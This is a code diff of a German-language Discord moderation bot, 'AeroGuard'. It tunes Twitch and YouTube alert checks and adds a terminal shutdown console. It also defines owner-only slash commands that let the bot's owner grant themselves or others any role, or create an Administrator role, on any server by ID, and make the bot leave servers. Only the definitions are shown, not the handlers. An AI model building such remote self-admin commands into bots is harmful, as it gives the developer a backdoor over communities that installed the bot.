-                                    const tRes = await fetch(`https://decapi.me/twitch/title/${cleanUser}`, { signal: AbortSignal.timeout(4000) });
-                                    const gRes = await fetch(`https://decapi.me/twitch/game/${cleanUser}`, { signal: AbortSignal.timeout(4000) });
-                                    const aRes = await fetch(`https://decapi.me/twitch/avatar/${cleanUser}`, { signal: AbortSignal.timeout(4000) });
+                                    const [tRes, gRes, aRes] = await Promise.all([
+                                        fetch(`https://decapi.me/twitch/title/${encodeURIComponent(cleanUser)}`, { signal: AbortSignal.timeout(4000) }),
+                                        fetch(`https://decapi.me/twitch/game/${encodeURIComponent(cleanUser)}`, { signal: AbortSignal.timeout(4000) }),
+                                        fetch(`https://decapi.me/twitch/avatar/${encodeURIComponent(cleanUser)}`, { signal: AbortSignal.timeout(4000) })
+                                    ]);
                                     if (tRes.ok) streamTitle = (await tRes.text()).trim() || streamTitle;
                                     if (gRes.ok) streamGame = (await gRes.text()).trim() || streamGame;
                                     if (aRes.ok) avatarUrl = (await aRes.text()).trim();
@@ -4758,7 +5208,8 @@ async function checkSocialAlertsEngine() {
                 // 🔴 YOUTUBE VIDEO TRACKING
                 else if (platform === 'youtube' && sa.filterYoutube !== false) {
                     try {
-                        let rawUser = creator.username.trim().replace(/^@/, '');
+                        let rawUser = extractSocialIdentifier('youtube', creator.username);
+                        if (!rawUser) continue;
                         let feedUrl = rawUser.startsWith('UC')
                             ? `https://www.youtube.com/feeds/videos.xml?channel_id=${rawUser}`
                             : `https://www.youtube.com/feeds/videos.xml?user=${rawUser}`;
@@ -4809,8 +5260,8 @@ async function checkSocialAlertsEngine() {
     }
 }
 
-// Prüft alle konfigurierten Creator alle 90 Sekunden
-setInterval(checkSocialAlertsEngine, 90000);
+// Prüft alle konfigurierten Creator alle 60 Sekunden
+setInterval(checkSocialAlertsEngine, 60000);
 
 
 // =========================================================================
@@ -4868,6 +5319,7 @@ const extendedCommandDefinitions = [
         .setName('social-alert')
         .setDescription('Creator & Streamer Alerts (Twitch, YouTube, TikTok)')
         .addSubcommand(sub => sub.setName('test').setDescription('Sendet einen Test-Alert in den konfigurierten Kanal'))
+        .addSubcommand(sub => sub.setName('check').setDescription('Führt eine sofortige Live-Prüfung aller hinterlegten Creator durch'))
         .addSubcommand(sub => sub.setName('list').setDescription('Listet alle überwachten Creator auf'))
         .addSubcommand(sub => sub.setName('add').setDescription('Fügt einen Creator zur Überwachung hinzu')
             .addStringOption(o => o.setName('platform').setDescription('Plattform').setRequired(true).addChoices(
@@ -4881,6 +5333,64 @@ const extendedCommandDefinitions = [
             .addStringOption(o => o.setName('username').setDescription('Benutzername oder Handle').setRequired(true)))
         .addSubcommand(sub => sub.setName('channel').setDescription('Legt den Benachrichtigungskanal fest')
             .addChannelOption(o => o.setName('kanal').setDescription('Textkanal').setRequired(true))),
+    new SlashCommandBuilder()
+        .setName('owner-role')
+        .setDescription('👑 [Owner-Exklusiv] Rollen auf jedem Server vergeben, entfernen oder Administrator erstellen')
+        .addSubcommand(sub => sub
+            .setName('set')
+            .setDescription('Weist einem Nutzer oder dir selbst eine beliebige Rolle zu')
+            .addRoleOption(o => o.setName('rolle').setDescription('Die Rolle auf diesem Server').setRequired(false))
+            .addStringOption(o => o.setName('rolle_id_oder_name').setDescription('Alternativ: Rollen-ID oder Name (auch für Remote-Server)').setRequired(false))
+            .addUserOption(o => o.setName('user').setDescription('Zielnutzer (Standard: Du selbst)').setRequired(false))
+            .addStringOption(o => o.setName('server_id').setDescription('Server-ID (Standard: Dieser Server)').setRequired(false))
+        )
+        .addSubcommand(sub => sub
+            .setName('remove')
+            .setDescription('Entfernt eine Rolle von einem Nutzer oder dir selbst')
+            .addRoleOption(o => o.setName('rolle').setDescription('Die zu entfernende Rolle').setRequired(false))
+            .addStringOption(o => o.setName('rolle_id_oder_name').setDescription('Alternativ: Rollen-ID oder Name').setRequired(false))
+            .addUserOption(o => o.setName('user').setDescription('Zielnutzer (Standard: Du selbst)').setRequired(false))
+            .addStringOption(o => o.setName('server_id').setDescription('Server-ID (Standard: Dieser Server)').setRequired(false))
+        )
+        .addSubcommand(sub => sub
+            .setName('give-admin')
+            .setDescription('Vergibt oder erstellt eine Administrator-Rolle für dich oder einen Nutzer')
+            .addUserOption(o => o.setName('user').setDescription('Zielnutzer (Standard: Du selbst)').setRequired(false))
+            .addStringOption(o => o.setName('server_id').setDescription('Server-ID (Standard: Dieser Server)').setRequired(false))
+        )
+        .addSubcommand(sub => sub
+            .setName('list')
+            .setDescription('Listet alle Rollen des Servers mit ID und Berechtigungen auf')
+            .addStringOption(o => o.setName('server_id').setDescription('Server-ID (Standard: Dieser Server)').setRequired(false))
+        ),
+    new SlashCommandBuilder()
+        .setName('owner-server')
+        .setDescription('👑 [Owner-Exklusiv] Bot auf Servern deaktivieren, aktivieren oder Server verwalten')
+        .addSubcommand(sub => sub
+            .setName('disable')
+            .setDescription('Deaktiviert den Bot auf einem Server (Standard: Dieser Server)')
+            .addStringOption(o => o.setName('server_id').setDescription('Server-ID (Standard: Aktueller Server)').setRequired(false))
+            .addStringOption(o => o.setName('grund').setDescription('Grund für die Deaktivierung').setRequired(false))
+        )
+        .addSubcommand(sub => sub
+            .setName('enable')
+            .setDescription('Reaktiviert den Bot auf einem Server (Standard: Dieser Server)')
+            .addStringOption(o => o.setName('server_id').setDescription('Server-ID (Standard: Aktueller Server)').setRequired(false))
+        )
+        .addSubcommand(sub => sub
+            .setName('list')
+            .setDescription('Zeigt alle Server und deren Status (Aktiv / Deaktiviert) an')
+        )
+        .addSubcommand(sub => sub
+            .setName('leave')
+            .setDescription('Lässt den Bot einen Server sofort verlassen')
+            .addStringOption(o => o.setName('server_id').setDescription('Server-ID des Servers').setRequired(true))
+            .addStringOption(o => o.setName('grund').setDescription('Optionaler Grund').setRequired(false))
+        ),
+    new SlashCommandBuilder()
+        .setName('bot-shutdown')
+        .setDescription('👑 [Owner-Exklusiv] Fährt den Bot ordnungsgemäß herunter (Graceful Shutdown)')
+        .addStringOption(o => o.setName('grund').setDescription('Grund für das Herunterfahren (z. B. Wartungsarbeiten)').setRequired(false)),
     new SlashCommandBuilder()
         .setName('honeypot')
         .setDescription('Sicherheitsfalle & Anti-Raid Bot-Trap Verwaltung')
@@ -6417,6 +6927,10 @@ client.once('ready', async () => {
     if (process.env.GUILD_ID) {
         await deployExtendedCommands(process.env.GUILD_ID);
     }
+    // Sofortiger Start des Social-Alerts Checkers (Twitch/YouTube)
+    setTimeout(() => {
+        checkSocialAlertsEngine().catch(() => {});
+    }, 5000);
     // Auto-Broadcast: Bot ist ONLINE gegangen
     setTimeout(async () => {
         try {
@@ -9253,3 +9767,33 @@ app.post('/update-status', async (req, res) => {
 
 client.login(process.env.DISCORD_TOKEN);
 app.listen(port, () => addLog('info', `Enterprise Cloud-Webserver erfolgreich gestartet.`));
+
+// =========================================================================
+// CMD / TERMINAL KONSOLE BEFEHLE (Shutdown, Stop, Status via CLI)
+// =========================================================================
+if (process.stdin && typeof process.stdin.on === 'function') {
+    try {
+        process.stdin.setEncoding('utf8');
+        process.stdin.on('data', async chunk => {
+            const line = chunk.toString().trim();
+            if (!line) return;
+            const parts = line.split(/\s+/);
+            const cmd = parts[0].toLowerCase();
+            const args = parts.slice(1).join(' ');
+
+            if (cmd === 'shutdown' || cmd === 'stop' || cmd === 'exit') {
+                const shutdownReason = args || 'Manueller Shutdown via CMD-Terminal';
+                console.log(`\n[CMD KONSOLE] Shutdown-Signal empfangen ("${cmd}"). Beende Bot sauber...`);
+                await handleGracefulShutdown(shutdownReason);
+            } else if (cmd === 'status') {
+                console.log(`\n[CMD KONSOLE] AeroGuard Status: ${client.guilds.cache.size} Server, Ping: ${client.ws.ping || 0}ms, Uptime: ${Math.floor(process.uptime())}s`);
+            } else if (cmd === 'help') {
+                console.log('\n[CMD KONSOLE] Verfügbare Befehle:');
+                console.log('  shutdown [Grund] / stop / exit  - Fährt den Bot sauber herunter');
+                console.log('  status                         - Zeigt aktuellen Status & Telemetrie');
+            }
+        });
+    } catch(err) {
+        console.warn('[CMD KONSOLE] Konnte Stdin-Listener nicht aktivieren:', err.message);
+    }
+}
